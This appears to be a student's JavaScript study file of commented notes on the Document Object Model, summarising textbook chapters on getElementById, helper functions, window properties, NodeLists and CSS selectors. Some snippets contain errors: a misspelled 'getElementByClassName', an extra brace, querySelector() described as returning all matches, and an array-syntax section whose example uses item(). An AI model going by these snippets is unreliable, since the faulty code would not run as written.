﻿// JavaScript source code
/*
Topic 4:
The Document Object Model (DOM)

Objectives:
4.1 Identify and construct the Document Object Model (DOM) tree:
		window, document, html, head, body, and other HTML elements.

4.2 Identify and handle document, form, keyboard, and mouse events: 
		onload, onfocus, onblur, onchange, onkeydown, onkeyup, onkeypress, onclick, onmouseover, and onmouseout.

4.3 Complete and debug code that outputs to a HTML document:
		document.write, innerHTML, textContent.

4.4 Complete and debug code that locates, modifies, and adds HTML elements & attributes to documents:
		getElementById, getElementsByTagName, getElementsByClassName.
		setAttribute, createElement.

4.5 Create events using event handlers and listeners:
		DOM events, HTML attribute event, addEventListener.

Review Chapter 15 of JavaScript: 20 Lessons to Successful Web Development, by Robin Nixon
*/

/*
Lesson 15: Interacting with the Document Object Model
	The Document Object Model (DOM) separates the different parts of an HTML document into a hierarchy of objects, each one having its own properties.
	The term property is used for referring to an attribute of an object, such as the HTML it contains, its width and height, etc:
		1. The outermost object possible is the window object, which is the current browser window, tab, iframe, or popped-up window.
		2. Underneath this is the document object, of which there can be more than one (such as several documents loaded into different iframes	within a page).
		3. Inside a document, there are other objects such as the head and body of a page.
			i. Within the head, there can be other objects such as the title and meta objects, as well as style and script tags.
			ii. Within the body, there exist numerous other	objects, including headings, anchors, forms, etc.
*/

/*
The DOM:
	Listed below shows a representation of the DOM of an example document, with the document title of Example, a meta tag in the head, and three HTML elements
	(a link, a form, and an image) in the body section:

		<!DOCTYPE html>
		<html>
		<head>
			<title>Example</title>
			<meta name="robots" content="index, follow" />
		</head>
		<body>
			<a href="http://yahoo.com">
				Visit Yahoo!
			</a>
			<form id="login" method="POST" action="form.php">
				<input name="name" type="text" value="Jane" />
				<input type="submit" />
			</form>
			<img src="dad.jpg" />
		</body>
		</html>

	Starting with the <head></head> section, you can see that there are two elements.
	The first is the document’s title of Example, contained within <title></title> tags, whereas the second is the self-closing meta tag, that tells search engine
	crawlers that the document may be crawled, its contents indexed, and any links can be followed:
		<title>Example</title>
		<meta name="robots" content="index, follow" />
	This is done by passing the value 'robots' to the name attribute and the string 'index, follow' to the content attribute.
	
	Next is the body of the document, which is contained within <body></body> tags.
	There are three elements in this section:
	The first is a link to http://yahoo.com in anchor <a></a> tags,
	The second is an embedded image, that uses a self-closing <img /> tag.
	The third is a form contained within <form></form> tags:
		<body>
			<a href="http://yahoo.com">
				Visit Yahoo!
			</a>
			<form id="login" method="post" action="form.php">
				<input name="name" type="text" value="Jane" />
				<input type="submit" />
			</form>
			<img src="dad.jpg" />
		</body>
	The form passes a value of login to the id attribute, post to the method attribute, and the program name form.php (the program that is to process the form
	data when it is submitted) is assigned to the action attribute, as follows (from now on, I will refer to the id attribute simply as, an element’s ID):
		<form id=′login’ method=′post’ action=′form.php’>
	The method used for sending the data to the server is specified by the method attribute, and its value can be either post or get.
	This example uses a post request that sends the data in a hidden manner, whereas the get request would pass the posted data by attaching it after the URL in
	what is known as a query string.
	Inside the form, there are two self-closing <input /> tags.
	The first passes the string value name to the name attribute, text to the type attribute, and the value "Jane" to the value attribute.
	This pre-populates the input field with the word Jane, but this can be altered by the user:
		<input name=′name’ type=′text’ value=′Jane’>
	After this, a second <input /> tag creates a submit button by passing the value submit to its type attribute:
		<input type=′submit’>
	Finally, the image is displayed:
		<img src="dad.jpg" />
*/

/*
	Accessing the DOM from JavaScript:
	Now let’s look at how elements can be manipulated from JavaScript, which should always be placed within <script></script> tags.
	For example, the following code changes the document’s title to 'An example web page':
		document.title = ′An example web page′;
	As you will recall, JavaScript uses the period operator, either to pass the current object to a function (or method), or to reference properties of objects.
	In this case, title is a property of the document object, so this statement has the same effect as if you opened the document in a program editor and directly
	edited the title within the <title></title> tags.
	Similarly, the form method type of 'post', could be easily changed to 'get':
		document.forms.login.method = ′get′;
	Here, the JavaScript first references the document, then the forms within that document, then the form with the ID of login, and its method, which is then
	modified.
*/

/*
	Using the getElementById() Function:
	I showed you how to access parts of a document by their type, but there’s a far easier method, which is to give every element in a document a unique ID, and
	then to access them from JavaScript using just those IDs.
	For example, if the <img> tag is given an ID (such as image1) with which it can be identified, it’s possible to replace the image loaded by it with another,
	as with the following code, in which the male-shaped dad.jpg image is replaced with mom.jpg to match the default name in the form field of Jane:
		<img src="dad.jpg" id="image1" />
		<script>
			document.getElementById("image1").src = "mom.jpg";
		</script>
	The trick here is to use the JavaScript function getElementById(), which will let you access any DOM element that has been given a unique ID.
	Let’s look at another example by restoring the previous name and image mismatch, by altering the default name value directly, rather than accessing the
	element via document.forms.login
	By giving the form field an ID (such as name) and using getElementById(), we can avoid the long-windedness of the previous example, and go straight to the
	element to change it, like this:
		<input name="name" type="text" value="Jane" id="name" />
		<script>
			document.getElementById("name").value = "Mike";
		</script>
	See how much easier it is than having to remember whether an element is part of a form, an image, or something else?
	All you have to do is know the ID of an element, and getElementById() will do the job of finding it for you.
*/

/*
	The Simpler O() Function:
	I use the getElementById() function so often that I have created a simple function called O() (with an uppercase O) to make it quicker to type in.
	The function looks like this and I place it at the start of any JavaScript, right after the opening <script> tag:
		<script>
			function O(i)
			{
				return document.getElementById(i);
			}
		</script>
	Doing this saves you 22 characters of typing each time that the replacement O() function is used, instead of the longer one.
	One reason for the tremendous shortening is that the preceding 'document.' has also been incorporated into the O() function, saving on typing in that too, as
	you can see if you compare the following long and short versions:
		document.getElementById("name").value = "mike";
		O('name').value = "mike";
	However, there’s one further step I like to take that makes the function even more useful and that’s to allow the passing to it of either element IDs, or an
	object that has already been created.
	Instead of manipulating the value of the form input with the ID of 'name' directly, let’s first create an object from this element:
		newobject = O(′name′);
	Now that I have this object, I can access it as often as I like without	ever having to call the O() function again:
		newobject.value = "mike";
			// a few lines of code go here
		newobject.value = "fred";
	Once I have created a function, I like to reuse it rather than writing a new one, and there are times when I would also like to	pass either an object to the
	O() function, or an ID name.
	Therefore, I prefer to use the following version of the function, which supports either type of argument:
		function O(i)
		{
			return typeof i == 'object' ? i : document.getElementById(i);
		}
	What is happening here is that the argument passed in i (for ID) is	analyzed by the code, and if it happens to already be of the type object, the object is
	simply returned because it is already an object.
	But if it is not of that type, it is assumed to be an ID name, in which case, it is looked up and returned as an object with a call to getElementById().
*/

/*
	The Partner S() Function:
	In a similar fashion to the space saving produced by using the O() function, there is one other function that I use frequently, because	its action is also
	used all the time in JavaScript, and that’s the new function S() (with an uppercase S).
	This enables JavaScript to easily access any style attribute of any element, if I wish to change the width and height of the image:
		<img src="mom.jpg" id="image1" />
		<script>
			O("image1").style.width = "150px" // long syntax
			S("image1").height = "120px" // short syntax

			function O(i)
			{
				return typeof i == 'object' ? i : document.getElementById(i);
			}
			function S(i)
			{
				return O(i).style;
			}
		</script>
	What I’ve done here is simply make the S() function place a call to the O() function, but with an added .style suffix, and now I can use O() for accessing
	elements by name and S() for accessing the style attributes of elements by name.
	Because the O() function allows either ID names or objects, I can pass either type of argument to S() as well.
	Therefore, if I have an object called myObject, I can change its width property:
		S(myObject).width = ′100px′
	This code can be quicker, as the object is only looked up once, and is therefore a more efficient way to code when an element may be accessed more than once.
	This works because you are allowed to enter <script> tags as many times as you like in a document; there is no requirement to keep all your JavaScript code
	within a single set of <script></script> tags.
*/

/*
	Accessing Multiple Elements by Class:
	So far, I’ve provided you with two simple functions that make it easy for you to access any element on a web page and any style property of an element.
	Sometimes, though, you will want to access more than one element at a time, and you can do this by assigning a CSS class name to each such element:
		<div class="MyClass">
			Div contents
		</div>
		<p class="MyClass">
			Paragraph contents
		</p>
	Then you can use the following handy C() function, to return an array containing all the objects that match the class name provided:
		function C(i)
			{
				return document.getElementsByClassName(i);
			}
	To use the function, simply call it like this, saving the returned array so that you can access each of the elements individually as required or, more likely
	to be the case, en masse via a loop:
		myArray = C(′myClass′)
	Now you can do whatever you like with the objects returned, such as setting their textDecoration style property to underline:
		for(i in MyArray)
			S(MyArray[i]).textDecoration = "underline";
	This code iterates through the objects in MyArray[], and then uses the S() function to reference each one’s style property, setting its	textDecoration
	property to underline.
*/

/*
	The Difference Between Properties in CSS and JavaScript:
	The textDecoration property is an example of a CSS property, that is normally hyphenated:
		text-decoration
	But because JavaScript reserves the hyphen character for use as a mathematical operator, whenever you access a hyphenated CSS property,	you must omit the
	hyphen and set the character immediately following it, to uppercase.
	The font-size property, is referenced in JavaScript as fontSize, when placed after a period operator:
		myObject.style.fontSize = "16pt";
		S(myObject).fontSize = "16pt";
	The only possible alternative to this is to be more long-winded and use the setAttribute() function, which supports (requires) standard CSS property names:
		myObject.setAttribute(′style’, ’font-size:16pt′)
	Some versions of Microsoft Internet Explorer are picky about using the JavaScript-style CSS property names under specific conditions.
	So if you ever encounter problems with them, simply revert to using the setAttribute() function.
*/

/*
	Summary of the Three Functions:
	Now you have three powerful functions you can use for quick and easy access of any individual web element, O(), its style property, S(), or a group of objects
	by class, C().
	Together, these will save you countless lines of programming code and speed up your development time substantially.
	Simply remember to copy the following into the section of any document you’ll be accessing via JavaScript:
		<script>
			function O(i)
			{
				return typeof i == 'object' ? i : document.getElementById(i);
			}
			function S(i)
			{
				return O(i).style;
			}
			function C(i)
			{
				return document.getElementsByClassName(i);
			}
		</script>
	With this code pasted at the start of your web pages, JavaScript programming should be as easy as possible.
	Better still, include this code in an external file named nbfunctions.js:
		<script src=′nbfunctions.js’></script>
	Just place that single line in the <head> of any web pages that will access the functions.
	I use O(), S(), and C(), because they substantially reduce the examples down in size, and also make them far easier for you to follow what’s going on.
*/

/*
	Some Common Properties:
	Using JavaScript, you can modify any property of any element in a web document, in a similar manner to using CSS.
	You can access CSS properties, using either the	JavaScript short form, or the setAttribute() function to use exact CSS property names.
	I’d like to show you how to access just a few of the CSS properties as an overview of some of the things you can do.
	First, let’s look at modifying a few CSS properties from JavaScript using the following code, which first creates a <div> object, and then statements within a
	<script></script> section that modify various attributes:
		<div id=′object’>
			Div Object
		</div>
		<script>
			S("object").border = "solid 1px red";
			S("object").width = "100px";
			S("object").height = "100px";
			S("object").background = "#eee";
			S("object").color = "blue";
			S("object").fontSize = "15pt";
			S("object").fontFamily = "Helvetica";
			S("object").fontStyle = "italic";
		</script>
	JavaScript also opens up access to a very wide range of other properties too, such as the width and height of the browser, and the same for any pop-up or
	in-browser windows or frames, and handy information such as the parent window, and the	history of URLs visited this session.
	All these properties are accessed from the window object via the period operator (window.name), and below lists them all along with descriptions:
		Properties		Sets and/or Returns
		closed			Returns a Boolean value indicating whether a window has been closed or not.
		defaultStatus	Sets or returns the default text in the status bar of a window.
		document		Returns the document object for the window.
		frames			Returns an array of all the frames and iframes in the window.
		history			Returns the history object for the window.
		innerHeight		Sets or returns the inner height of a window's content area.
		innerWidth		Sets or returns the inner width of a window's content area.
		length			Returns the number of frames and iframes in a window.
		location		Returns the location object for the window.
		name			Sets or returns the name of a window.
		navigator		Returns the navigator object for the window.
		opener			Returns a reference to the window that created the window.
		outerHeight		Sets or returns the outer height of a window, including tool and scroll bars.
		outerWidth		Sets or returns the outer width of a window, including tool and scroll bars.
		pageXOffset		Returns the pixels the document has been scrolled horizontally from the left of the window.
		pageYOffset		Returns the pixels the document has been scrolled vertically from the top of the window.
		parent			Returns the parent window of the window.
		screen			Returns the screen object for the window.
		screenLeft		Returns the x coordinate of the window relative	to the screen (IE8 & below, not Firefox).
		screenTop		Returns the y coordinate of the window relative	to the screen (IE8 & below, not Firefox).
		screenX			Returns the x coordinate of the window relative	to the screen (IE9 & above).
		screenY			Returns the y coordinate of the window relative	to the screen (IE9 & above).
		self			Returns the current window.
		status			Sets or returns the text in the status bar of a	window.
		top				Returns the top browser window.
	There are a few points to note about some of these properties:
		The defaultStatus and status properties can be set, only if users have modified their browsers to allow it.
		The history object cannot be read from (you can't see where your visitors have been surfing).
		However, it supports the length property to determine how long the history is, and the back(), forward(), and go() methods to navigate to specific pages
		in the history.
	When you need to know how much space is available in a current window of the web browser, just read the values in:
		window.innerHeight and window.innerWidth
	I often use these values for centering in-browser pop-up alerts or confirm dialog windows.
	The screen object supports the following read properties:
		availHeight, availWidth, colorDepth, height, pixelDepth, width
	Therefore it is great for determining information about the user’s display.
	These few items of information will get you started and already provide you with many new and interesting things you can do with JavaScript.
	Now that you know how to access and use properties, all you need is a resource listing them all, so I recommend you check out the following URL as a good
	initial point to start:
		http://tinyurl.com/domproperties
*/

/*
	Summary
	Having become comfortable with working with the DOM in this lesson, you will now be able to easily access and modify most JavaScript elements and properties,
	either individually by ID name, or as objects, or in groups by class names.
	You will also have added the three handy functions O(), S(), and C() to your programming toolkit to help with these things.

	Self-Test Questions
	You can find the answers in Appendix A.
	1. Which function is used to return an object based on an element’s ID?
	2. How can you modify a style property of an object?
	3. Which function returns an array of objects for all elements of a specified type in a document?
	4. How would you set the font size of the object MyObject to 12 points, using the setAttribute() function?
	5. How can you achieve the same result as question 4 without using setAttribute()?
	6. How can you determine how much space is available in the current window of the web browser?
	7. How can you determine the width and height of the screen of the user’s device?
	8. How can you change the title of the current document from JavaScript?
	9. In JavaScript, how can you change the image displayed by an <img> tag?
	10. In JavaScript, how can you change the width and height of an image (or other element)?
*/

/*
Review Chapter 5 of JavaScript & JQuery: Interactive Front-End Web Development, By John Wiley & Sons
Chapter 5: Document Object Model
	OVERVIEW
	The Document Object Model (DOM) specifies how browsers should create a model of an HTML page, and how JavaScript can access and update the contents of a web
	page while it is in the browser window.
	The DOM is neither part of HTML nor part of JavaScript; it is a	separate set of rules.
	It is implemented by all major browser makers, and covers two primary areas:
		MAKING A MODEL OF THE HTML PAGE
		When the browser loads a web page, it creates a model of the page in memory.
		The DOM specifies the way in which the browser should structure this model, using a DOM tree.
		The DOM is called an object model, because the model (the DOM tree)	is made of objects.
		Each object represents a different part of the page loaded in the browser window.
*/

/*
		ACCESSING AND CHANGING THE HTML PAGE
		The DOM also defines methods and properties to access and update each object in this model, which in turn updates what the user sees in the browser.
		You will hear people call the DOM an Application Programming Interface (API).
		User interfaces let humans interact with programs; APIs let programs and scripts communicate with each other.
		The DOM states what your script can ask the browser about the current page, and how to tell the browser to update what is being shown to the user.
		HOT, COOL, NORMAL, COMPLETE

		THE DOM TREE IS A MODEL OF A WEB PAGE
		As a browser loads a web page, it creates a model of that page, this model is called a DOM tree, and it is stored in the browsers' memory.
		It consists of four main types of nodes:
			BODY OF HTML PAGE
				<!DOCTYPE html>
				<html>
					<head>
						<title>DOM</title>
						<meta charset="utf-8" />
					</head>
					<body>
						<div id="page">
							<h1 id="header">List</h1>
							<h2>Buy Groceries</h2>
							<ul>
								<li id="one" class="hot"><em>fresh</em> figs</li>
								<li id="two" class="hot">pine nuts</li>
								<li id="three" class="hot">honey</li>
								<li id="four">balsamic vinegar</li>
							</ul>
							<script src="js/list.js"></script>
						</div>
					</body>
				</html>
			THE DOCUMENT NODE
				Above, you can see the HTML code for a shopping list, and on the right hand page is its DOM tree.
				Every element, attribute, and piece of text in the HTML is represented by its own DOM node.
				At the top of the tree a document node is added; it represents the entire page (and corresponds to the document object).
				When you access any element, attribute, or text node, you navigate to it via the document node.
				It is the starting point for all visits to the DOM tree.
			ELEMENT NODES
				HTML elements describe the structure of an HTML page.
				(The <h1>-<h6> elements describe what parts are headings; the <p> tags indicate where paragraphs of text start and finish; etc.)
				To access the DOM tree, you start by looking for elements.
				Once you find the element you want, then you can access its text and attribute nodes if you want to.
				This is why you start by learning methods that allow you to access element nodes, before learning to access and alter text or attributes.
				Relationships between the document and all of the element nodes are	described using the same terms as a family tree:
					parents, children, siblings, ancestors, and descendants.
				(Every node is a descendant of the document node.)
				Each node is an object with methods and properties.
				Scripts access and update this DOM tree (not the source HTML file).
				Any changes made to the DOM tree are reflected in the browser.
			DOM TREE
								document
								html
								body
								div - attribute
								-|-
					h1 - attribute		h2		    ul		script - attribute
					|					|		    |
					text				text	    |
													|
			li - attribute		li - attribute		li - attribute		li-attribute
			   _|_
			em	  text			text				text				text
			|
			text
			ATTRIBUTE NODES
				The opening tags of HTML elements can carry attributes and these are represented by attribute nodes in the DOM tree.
				Attribute nodes are not children of the element that carries them; they are part of that element.
				Once you access an element, there are specific JavaScript methods and properties to read, or change that element's attributes.
				For example, it is common to change the values of class attributes to trigger new CSS rules that affect their presentation.
			TEXT NODES
				Once you have accessed an element node, you can then reach the text	within that element, stored in its own text node.
				Text nodes cannot have children.
				If an element contains text and another child element, the child element is not a child of the text node, but a child of the containing element.
				(See the <em> element on the first <li> item.)
				The <em> element on the first <li> item, illustrates how the text node is always a new branch of the DOM tree, and no further branches come off it.
*/

/*
			WORKING WITH THE DOM TREE
				Accessing and updating the DOM tree involves two steps:
					1. Locate the node that represents the element you want to work with.
					2. Use its text content, child elements, and attributes.

			STEP 1: ACCESS THE ELEMENTS
				SELECT AN INDIVIDUAL ELEMENT NODE
				Here are three common ways to select an individual element:
					1. getElementById():
						uses the value of an element's unique id attribute.
					2. querySelector()
						uses a CSS selector to return the first matching element.
					3. You can also select individual elements, by traversing from one element to another within the DOM tree.

				SELECT MULTIPLE ELEMENTS (NODELISTS)
					Here are three common ways to select multiple elements:
					1. getElementsByClassName():
						Selects all elements that have the specified class name.
					2. getElementsByTagName():
						Selects all elements that have the specified tag name.
					3. querySelector()
						uses a CSS selector to select all matching elements.

				TRAVERSING BETWEEN ELEMENT NODES
				You can move from one element node to a related element node:
				1. parentNode:
					Selects the parent of the current element node (returning just one element).
				2. previousSibling/nextSibling:
					Selects the previous/next sibling from the DOM tree.
				3. firstChild / lastChild
					Selects the first/last child of the current element.

		Throughout the chapter, you will see notes where DOM methods only work in certain browsers, or are buggy.
		Inconsistent browser support for the DOM was a key reason why jQuery became so popular.
		The terms elements and element nodes are used interchangeably, but when people say the DOM is working with an element, it is actually working with a node
		that represents that element.
*/

/*
			STEP 2: WORK WITH THOSE ELEMENTS
				ACCESS/UPDATE TEXT NODES
				The text inside any element is stored inside a text node, so to access the text node above:
					1. Select the <li> element.
					2. Use the firstChild property to get the text node.
					3. Use the text node's only property (nodeValue) to get the text from the element.
						The nodeValue property lets you access or update contents of a text node.
						The text node does not include text inside any child elements.

				WORK WITH HTML CONTENT
				The innerHTML property allows access to child elements and text content.
				The textContent property is only specific to text content.
				Several methods let you create new nodes, add nodes to a tree, and remove nodes from a tree, all known as DOM manipulation:
					createElement()
					createTextNode()
					appendChild()/removeChild()

				ACCESS OR UPDATE ATTRIBUTE VALUES
					1. className / id lets you get or update the value of the class
						and id attributes:
						hasAttribute()		The first checks if an attribute exists.
						getAttribute()		The second gets its value.
						setAttribute()		The third updates the value.
						removeAttribute()	The fourth removes an attribute.
*/

/*		
	CACHING DOM QUERIES
	Methods that find elements in the DOM tree are called DOM queries.
	When you need to work with an element more than once, you should use a variable to store the result of this query.
	When a script selects an element to access or update, the interpreter must find the element(s) in the DOM tree.
	Below, the interpreter is told to look through the DOM tree for an element whose id attribute has a value of 'one'.
	Once it has found the node that represents the element(s), you can work with that node, its parent, or any children:
			getElementById('one');
					|
				   body
					|
				   div
				   -|-
			h1	h2		ul	script
			*li	li		li	  li
	When people talk about storing elements in variables, they are really storing the location of the element(s) within the DOM tree inside a variable.
	The properties and methods of that element node work on the variable.
	If your script needs to use the the same element(s) more than once, you can store the location of the element(s) in a variable.
	This saves the browser looking through the DOM tree to find the same element(s) again, this is known as caching the selection.
	Programmers would say that the variable stores a reference to the object in the DOM tree (it is storing the location of the node).
			var itemOne = getElementById('one');
						|
					   body
						|
					   div
					   -|-
				h1	h2		ul	script
				*li	li		li	  li
	The variable itemOne does not store the <li> element, it stores a reference to where that node is in the DOM tree (using the unique id 'one').
	To access the text content of this element, you might use the variable name:
			itemOne.textContent
*/

/*
	ACCESSING ELEMENTS
	DOM queries may return one element, or they may return a NodeList, which is a collection of nodes.
	Sometimes you will just want to access one individual element (or a fragment of the page that is stored within that one element).
	Other times you may want to select a group of elements, for example, every <h1> element in the page, or every <li> element within a particular list.
	Here, the DOM tree shows the body of the page of the list example.
	We focus on accessing elements first, so it only shows element nodes, and highlight which elements a DOM query would return.
	Element nodes are the DOM representation of an element.
			   body
			    |
			   div
			   -|-
		h1	h2		ul	script
		li	li		li	  li

	GROUPS OF ELEMENT NODES
	If a method can return more than one node, it will always return a NodeList, which is a collection of nodes.
	You then need to select the element you want from this list using an index number (numbering starts at 0 like the elements in an array).
	For example, several elements can have the same tag name, so getElementsByTagName() will always return a NodeList.

	FASTEST ROUTE
	Finding the quickest way to access an element within your web page will make the page seem faster and/or more responsive.
	This usually means evaluating the minimum number of nodes on the way to	the element you want to work with.
	For example, getElementById() will quickly return one element (because no two elements on the same page should have the same value for an id attribute), but
	it can only be used when the element you want to access has an id attribute.

	METHODS THAT RETURN A SINGLE ELEMENT NODE
	1. getElementById('id');
	Selects an individual element given the value of its id attribute, HTML must have an id attribute in order for it to be selectable.
	First supported: IE5.5, Opera 7, Chrome, Firefox, Safari.

	2. querySelector('css selector');
	Uses CSS selector syntax that would select one or more elements, this returns only the first of the matching elements.
	First supported: IE8, Firefox 3.5, Safari 4, Chrome 4, Opera 10

	METHODS THAT RETURN ONE OR MORE ELEMENTS (AS A NODELIST):
	1. getElementsByClassName('class');
	Selects one or more elements given the value of the class attribute, HTML must have a class attribute for it to be selectable, faster than querySelectorAll().
	First supported: IE9, Firefox 3, Safari 4, Chrome 4, Opera 10

	2. getElementsByTagName('tagName');
	Selects all elements on the page with the specified tag name, faster than querySelectorAll().
	First supported: IE6+, Firefox 3, Safari 4, Chrome, Opera 10

	3. querySelectorAll('css selector')
	Uses CSS selector syntax to select one or more elements, and returns all of those that match.
	First supported: IE8, Firefox 3.5, Safari 4, Chrome 4, Opera 10

	METHODS THAT SELECT INDIVIDUAL ELEMENTS
	getElementById() and querySelector() can both search an entire document and return individual elements, and both use a similar syntax.
	getElementById() is the quickest and most efficient way to access an element, because no two elements can share the same value for their id attribute.
	querySelector() is a more recent addition to the DOM, so it is not supported in older browsers.
	But, it is very flexible because its parameter is a CSS selector, which means it can be used to accurately target many more elements:
		object.method(parameter);
		document.getElementById('one');
			document(Object):
				document refers to the document object, and you always have to access individual elements via the document object.
			.(Member Operator):
				The dot notation indicates that the method is being applied to the node on the left of the period.
			getElementById('one')(Method):
				The getElementById() method indicates that you want to find	an element based upon the value of its id attribute.
			('one')(Parameter):
				The method needs to know the value of the id attribute on the element you want, this is the parameter of the method.
	This code will return the element node for the element whose id attribute has a value of 'one'.
	Here, the method is used on the document object so it looks for that element anywhere within the page.
	DOM methods can also be used on element nodes within the page to find descendants of that node.
*/

/*
SELECTING ELEMENTS USING ID ATTRIBUTES
	HTML	c05/get-element-by-id.html
	<h1 id="header">List King</h1>
	<h2>Buy Groceries</h2>
	<ul>
		<li id="one" class="hot"><em>fresh</em>figs</li>
		<li id="two" class="hot">pine nuts</li>
		<li id="three" class="hot">honey</li>
		<li id="four">balsamic vinegar</li>
	</ul>

	JAVASCRIPT	c05/js/get-element-by-id.js
	var el = document.getElementById("one"); // select the element and store it in a variable
	el.className = 'cool';					 // change the value of the class attribute

	getElementById() allows you to select a single element node by specifying the value of its id attribute.
	This method has one parameter: the value of the id attribute on the element you want to select.
	This value is placed inside single or double quote marks because it is a string.
	The first line of JavaScript code finds the element whose id attribute has a value of 'one', and stores a reference to that node in a variable called 'el'.
	The code then uses a property called className, to update the value of the class attribute of the element stored in this variable.
	Its value is 'cool', and this triggers a new rule in the CSS that sets the background color of that element to aqua.
	The className property is used on the variable that stores the reference to the element.
	This is one of the oldest and best supported methods for accessing elements.
*/

/*
	NODELISTS: DOM QUERIES THAT RETURN MORE THAN ONE ELEMENT
	When a DOM method can return more than one element, it returns a NodeList, a collection of element nodes.
	Each node is given an index number (starting at zero, just like an index-based array).
	The order in which the element nodes are stored in a NodeList is the same order that they appeared in the HTML page.
	When a DOM query returns a NodeList, you may want to:
		1. Select one element from the NodeList.
		2. Loop through each item in the NodeList and perform the same statements on each of the element nodes.
	NodeLists look like arrays and are numbered like arrays, but they are not actually arrays; they are a type of object called a collection.
	Like any other object, a NodeList has properties and methods, notably:
		1. The length property tells you how many items are in the NodeList.
		2. The item() method returns a specific node from the NodeList when you tell it the index number of the item that you want (in parentheses).
		   However, it is more common to use array syntax (with square brackets) to retrieve an item from a NodeList.

		LIVE & STATIC NODELISTS
		There are times when you will want to work with the same selection of elements several times, so the NodeList can be stored in a variable and re-used
		(rather than collecting the same elements again):
			1. In a live NodeList, when your script updates the page, the NodeList is updated at the same time.
			   The methods beginning getElementsBy… will return live NodeLists, typically faster to generate than static NodeLists.

			2. In a static NodeList when your script updates the page, the NodeList is not updated to reflect the changes made by the script.
			   The new methods that begin querySelector… (using CSS selector syntax) return static NodeLists.
			   They reflect the document when the query was made.
			   If the script changes the content of the page, the NodeList is not updated to reflect those changes.

				Here, you can see four different DOM queries that all return a NodeList.
				For each query, you can see the elements and their index numbers in the NodeList that is returned.
				1. getElementsByTagName('h1'):
				   Even though this query only returns one element, the method still returns a NodeList because of the potential for returning more than one
				   element.
						INDEX NUMBER & ELEMENT
						________________________
						 0  <h1>
				2. getElementsByTagName('li'):
					This method returns four elements, one for each of the <li> elements on the page, in the same order they appear on the HTML page.
						INDEX NUMBER & ELEMENT
						________________________________
						0  <li id="one" class="hot">
						................................
						1  <li id="two" class="hot">
						................................
						2  <li id="three" class="hot">
						................................
						3  <li id="four">
				3. getElementsByClassName('hot'):
					This NodeList contains only three of the <li> elements, as we are searching for elements of the class attribute, not tag name.
						INDEX NUMBER & ELEMENT
						________________________________
						0  <li id="one" class="hot">
						................................
						1  <li id="two" class="hot">
						................................
						2  <li id="three" class="hot">
				4. querySelectorAll('li[id]')
					This method returns four elements, one for each <li> element on the page that have an id attribute (regardless of values of id attributes).
						INDEX NUMBER & ELEMENT
						________________________________
						0  <li id="one" class="hot">
						................................
						1  <li id="two" class="hot">
						................................
						2  <li id="three" class="hot">
						................................
						3  <li id="four">

		SELECTING AN ELEMENT FROM A NODELIST
			There are two ways to select an element from a NodeList:
			1. The item() method
			2. The array syntax.
			Both requiring the index number of the element you want.
*/

/*
	THE item() METHOD
	NodeLists have a method called item() which will return an individual node from the NodeList.
	You specify the index number of the element you want as a parameter of the method (inside the parentheses).
	So programmers often check that there is at least one item in the NodeList before running any code.
	To do this, we use the length property of the NodeList, it tells you how many items the NodeList contains.
	Here you can see that an if statement is used, the condition for the if statement is whether the length property of the	NodeList is greater than zero.
	If it is, then the statements inside the if statement are executed.
	If not, the code continues to run after the second curly brace:
		var elements = document.getElementsByClassName('hot');
		if(elements.length >= 1)
		{
			var firstItem = elements.item(0);
		}
		1. Select elements that have a class attribute whose value is 'hot', and store the NodeList in a variable called 'elements'.
		2. Use the length property to check how many elements were found.
				If 1 or more elements with the class 'hot' are found, run the code in the if statement.
		3. Store the first element from the NodeList in a variable called firstItem (index numbers start at zero).
	Array syntax is preferred over the item() method because it is faster.
	Before selecting a node from a NodeList, check that it contains multiple nodes, and if you repeatedly use the NodeList, store it inside a variable.
*/

/*
	ARRAY SYNTAX
	You can access individual nodes using a square bracket syntax similar to that used to access individual items from an array.
	You specify the index number of the element you want inside square brackets that follow the NodeList.
	As with all DOM queries, if you need to access the same NodeList several times, store the result of the DOM query in a variable.
	In the examples on both of these pages, the NodeList is stored in a variable called elements.
	If you create a variable to hold a NodeList, but there are no matching elements, the variable will be an empty NodeList.
	When you check the length property of the variable, it will return the number 0, because it does not contain any elements:
		var elements = document.getElementByClassName('hot');
		if (elements.length >= 1)
		{
			var firstItem = elements.item(0);
		}
		1. Create a NodeList containing elements that have a class attribute of 'hot', and store it in the variable 'elements'.
		2. If that number is greater than or equal to one, run the code inside the if statement.
		3. Get the first element from the NodeList (index numbers start at zero).
*/

/*
	SELECTING ELEMENTS USING CLASS ATTRIBUTES
The getElementsByClassName() method allows you to select elements whose class attribute contains a specific value.
The method has one parameter: the class name which is given in quotes within the parentheses after the method name.
Because several elements can have the same value for their class attribute, this method always returns a NodeList:
	JAVASCRIPT	c05/js/get-element-by-class-name.js
	// find hot items
	var elements = document.getElementByClassName('hot');
	// if 3 or more are found
	if(elements.length > 2)
	{
		var el = elements[2];		// Select the third one from the NodeList
		el.className = 'cool';		// Change the value of its class attribute
	}
		This starts by looking for elements whose class attribute contains 'hot' (the value of a class attribute can contain several class names, separated by a
		space.)
		The result of this DOM query is stored in a variable called 'elements', because it is used more than once in the example.
		An if statement checks if the query found more than two elements.
		If so, the third one is selected and stored in a variable called el.
		The class attribute of that element is then updated to say class (triggering a new CSS style, changing the presentation of that element).
		Browser Support: IE9, Firefox 3, Chrome 4, Opera 9.5, Safari 3.1
*/

/*
	SELECTING ELEMENTS BY TAG NAME
The getElementsByTagName() method allows you to select elements using their tag name.
The element name is specified as a parameter, so it is placed inside the parentheses and is contained by quote marks.
Note that you do not include the angled brackets that surround the tag name in the HTML (just the letters inside the brackets).
	JAVASCRIPT    c05/js/get-elements-by-tag-name.js
	// find <li> elements
   var elements = document.getElementsByTagName('li');
   // If 1 or more are found
   if (elements.length > 0) {                             
   {
	   var el = elements[0];  // Select the first one using array syntax
       el.className = 'cool'; // Change the value of the class attribute
   }
		This example looks for any <li> elements in the document, and stores the result in a variable called elements, because the result is used more than once.
		An if statement checks if any <li> elements were found.
		As with any element that can return a NodeList, you check that there will be a suitable element before you try to work with it.
		If matching elements were found, the first one is selected and its class attribute is updated, changing the color of the list item to make it aqua.
		Browser Support: Very good - it is safe to use in any scripts.      
*/

/*
	SELECTING ELEMENTS USING CSS SELECTORS
querySelector() returns the first element node that matches the CSS-style selector.
querySelectorAll() returns a NodeList of all of the matches.
Both methods take a CSS selector as their only parameter.
The CSS selector syntax offers more flexibility and accuracy when selecting an element than just specifying a class name or a tag name, and should be familiar to
front-end web developers who are used to targeting elements using CSS:
  JAVASCRIPT    c05/js/query-selector.js
   // querySelector() only returns the first match
   var el = document.querySelector('li.hot');
   el.className = 'cool';

